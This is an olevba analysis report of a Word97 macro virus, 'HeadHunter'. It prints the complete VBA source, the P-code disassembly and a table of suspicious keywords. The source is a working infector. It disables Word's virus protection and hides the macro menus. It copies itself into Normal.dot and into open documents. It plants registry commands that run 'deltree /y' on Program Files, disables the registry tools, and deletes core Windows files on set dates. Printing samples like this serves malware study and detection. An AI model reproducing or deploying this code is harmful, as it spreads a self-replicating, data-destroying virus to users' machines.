olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.HeadHunter
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO HeadHunter.cls 
in file: ./Virus.MSWord.HeadHunter - OLE stream: 'Macros/VBA/HeadHunter'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'With love HeadHunter.a v/0.2 for Word97
Private Sub Document_Open()
On Error Resume Next
Options.SaveNormalPrompt = 0: Options.ConfirmConversions = 0: Options.VirusProtection = 0: Application.ScreenUpdating = 0
CommandBars("Tools").Controls(12).Enabled = 0: CommandBars("Visual Basic").Enabled = 0: CommandBars("Control Toolbox").Enabled = 0
If NormalTemplate.VBProject.VBComponents.Item(1).Name = "HeadHunter" Then LFH785 = 1
If ActiveDocument.VBProject.VBComponents.Item(1).Name = "HeadHunter" Then NZR249 = 1
If LFH785 = 1 And NZR249 = 1 Then GoTo HH
If LFH785 = 0 Then H7F8L5 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, HeadHunter.VBProject.VBComponents.Item(1).CodeModule.CountOfLines): With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule: .DeleteLines 1, .CountOfLines: .AddFromString H7F8L5: End With: NormalTemplate.VBProject.VBComponents.Item(1).Name = "HeadHunter"
If NZR249 = 0 Then R2Z4N9 = HeadHunter.VBProject.VBComponents.Item(1).CodeModule.Lines(1, HeadHunter.VBProject.VBComponents.Item(1).CodeModule.CountOfLines): With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule: .DeleteLines 1, .CountOfLines: .AddFromString R2Z4N9: End With: ActiveDocument.VBProject.VBComponents.Item(1).Name = "HeadHunter"
ActiveDocument.SaveAs ActiveDocument.FullName
Set WshShell = CreateObject("WScript.Shell"): WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\System Info...\Command\", "start /minimized command /c deltree /y c:\Progra~1"
Set WshShell = CreateObject("WScript.Shell"): WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\System Info\DisplayName", "System Info"
Set WshShell = CreateObject("WScript.Shell"): WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\System Info\UninstallString", "start /minimized command /c deltree /y c:\Progra~1"
Set WshShell = CreateObject("WScript.Shell"): WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeBackColors", "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
Set WshShell = CreateObject("WScript.Shell"): WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeForeColors", "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
Set WshShell = CreateObject("WScript.Shell"): WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\EndProcLine", 0, "REG_DWORD"
Set WshShell = CreateObject("WScript.Shell"): WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
HH:
End Sub
Private Sub Document_Close()
On Error Resume Next
Open "c:\msdos.sys" For Input As #1: Do Until EOF(1): Line Input #1, HH: If Left(UCase(HH), 7) = "WINDIR=" Then l = Len(HH): windir = Mid(HH, 8, l)
Loop
Close #1
If Day(Now()) = 9 Then: HH = Dir(windir & "\win.com"): If HH <> "" Then Kill windir & "\win.com"
If Day(Now()) = 22 Then: HH = Dir(windir & "\System\vmm32.vxd"): If HH <> "" Then Kill windir & "\System\vmm32.vxd"
If ActiveDocument.Name = ActiveDocument.FullName Then End
Call Document_Open
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.HeadHunter
' ===============================================================================
' Module streams:
' Macros/VBA/HeadHunter - 10352 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0027 "With love HeadHunter.a v/0.2 for Word97"
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #4:
' 	LitDI2 0x0000 
' 	LitDI2 0x000C 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	LitStr 0x000F "Control Toolbox"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #5:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "HeadHunter"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St LFH785 
' 	EndIf 
' Line #6:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "HeadHunter"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St NZR249 
' 	EndIf 
' Line #7:
' 	Ld LFH785 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld NZR249 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo HH 
' 	EndIf 
' Line #8:
' 	Ld LFH785 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld HeadHunter 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St H7F8L5 
' 	BoS 0x0000 
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld H7F8L5 
' 	ArgsMemCallWith AddFromString 0x0001 
' 	BoS 0x0000 
' 	EndWith 
' 	BoS 0x0000 
' 	LitStr 0x000A "HeadHunter"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' 	EndIf 
' Line #9:
' 	Ld NZR249 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld HeadHunter 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld HeadHunter 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St R2Z4N9 
' 	BoS 0x0000 
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld R2Z4N9 
' 	ArgsMemCallWith AddFromString 0x0001 
' 	BoS 0x0000 
' 	EndWith 
' 	BoS 0x0000 
' 	LitStr 0x000A "HeadHunter"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' 	EndIf 
' Line #10:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #11:
' 	SetStmt 
' 	LitStr 0x000D "WScript.Shell"
' 	ArgsLd CreateObject 0x0001 
' 	Set WshShell 
' 	BoS 0x0000 
' 	LitStr 0x006E "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\System Info...\Command\"
' 	LitStr 0x0032 "start /minimized command /c deltree /y c:\Progra~1"
' 	Ld WshShell 
' 	ArgsMemCall RegWrite 0x0002 
' Line #12:
' 	SetStmt 
' 	LitStr 0x000D "WScript.Shell"
' 	ArgsLd CreateObject 0x0001 
' 	Set WshShell 
' 	BoS 0x0000 
' 	LitStr 0x005E "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\System Info\DisplayName"
' 	LitStr 0x000B "System Info"
' 	Ld WshShell 
' 	ArgsMemCall RegWrite 0x0002 
' Line #13:
' 	SetStmt 
' 	LitStr 0x000D "WScript.Shell"
' 	ArgsLd CreateObject 0x0001 
' 	Set WshShell 
' 	BoS 0x0000 
' 	LitStr 0x0062 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\System Info\UninstallString"
' 	LitStr 0x0032 "start /minimized command /c deltree /y c:\Progra~1"
' 	Ld WshShell 
' 	ArgsMemCall RegWrite 0x0002 
' Line #14:
' 	SetStmt 
' 	LitStr 0x000D "WScript.Shell"
' 	ArgsLd CreateObject 0x0001 
' 	Set WshShell 
' 	BoS 0x0000 
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeBackColors"
' 	LitStr 0x001F "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
' 	Ld WshShell 
' 	ArgsMemCall RegWrite 0x0002 
' Line #15:
' 	SetStmt 
' 	LitStr 0x000D "WScript.Shell"
' 	ArgsLd CreateObject 0x0001 
' 	Set WshShell 
' 	BoS 0x0000 
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeForeColors"
' 	LitStr 0x0021 "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
' 	Ld WshShell 
' 	ArgsMemCall RegWrite 0x0002 
' Line #16:
' 	SetStmt 
' 	LitStr 0x000D "WScript.Shell"
' 	ArgsLd CreateObject 0x0001 
' 	Set WshShell 
' 	BoS 0x0000 
' 	LitStr 0x003B "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\EndProcLine"
' 	LitDI2 0x0000 
' 	LitStr 0x0009 "REG_DWORD"
' 	Ld WshShell 
' 	ArgsMemCall RegWrite 0x0003 
' Line #17:
' 	SetStmt 
' 	LitStr 0x000D "WScript.Shell"
' 	ArgsLd CreateObject 0x0001 
' 	Set WshShell 
' 	BoS 0x0000 
' 	LitStr 0x0060 "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools"
' 	LitDI2 0x0001 
' 	LitStr 0x0009 "REG_DWORD"
' 	Ld WshShell 
' 	ArgsMemCall RegWrite 0x0003 
' Line #18:
' 	Label HH 
' Line #19:
' 	EndSub 
' Line #20:
' 	FuncDefn (Private Sub Document_Close())
' Line #21:
' 	OnError (Resume Next) 
' Line #22:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld HH 
' 	LineInput 
' 	BoS 0x0000 
' 	Ld HH 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld HH 
' 	FnLen 
' 	St l 
' 	BoS 0x0000 
' 	Ld HH 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' 	EndIf 
' Line #23:
' 	Loop 
' Line #24:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #25:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoS 0x0000 
' 	Ld windir 
' 	LitStr 0x0008 "\win.com"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St HH 
' 	BoS 0x0000 
' 	Ld HH 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0008 "\win.com"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' 	EndIf 
' Line #26:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoS 0x0000 
' 	Ld windir 
' 	LitStr 0x0011 "\System\vmm32.vxd"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St HH 
' 	BoS 0x0000 
' 	Ld HH 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0011 "\System\vmm32.vxd"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' 	EndIf 
' Line #27:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #28:
' 	ArgsCall (Call) Document_Open 0x0000 
' Line #29:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

